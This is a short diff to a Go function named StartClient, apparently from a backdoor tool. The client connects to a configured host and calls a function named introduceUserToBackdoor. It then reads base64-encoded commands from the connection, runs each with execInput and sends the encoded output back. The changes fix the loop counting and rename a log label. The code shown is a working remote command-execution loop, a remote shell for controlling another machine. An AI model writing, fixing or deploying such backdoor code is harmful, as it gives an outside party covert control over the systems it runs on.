@@ -388,7 +388,7 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 	introduceUserToBackdoor(conn,user )
 	num := readCmdLen(conn)
 	// fmt.Println(num)
-	for count := 0; count < num; count++ {
+	for count := 0; count <= num; count++ {
 		buffer := make([]byte, 1024)
 		setReadDeadLine(conn)
 		_, err := conn.Read(buffer)
@@ -401,7 +401,7 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 		resp := execInput(string(sDec))
 		time.Sleep(time.Second)
 		encodedResp := base64.StdEncoding.EncodeToString([]byte(resp))
-		CONFIG.CLIENTLOG.Println("\nRES:\n", resp)
+		CONFIG.CLIENTLOG.Println("\nRESPONSE:\n", resp)
 		setWriteDeadLine(conn)
 		_, err = conn.Write([]byte(encodedResp))
 		if err != nil {
@@ -410,7 +410,6 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 		}
 		time.Sleep(time.Second)
 		buffer = nil
-		count++
 	}
 
 	CONFIG.CLIENTLOG.Println("All commands ran successfully. Returning exit success.")
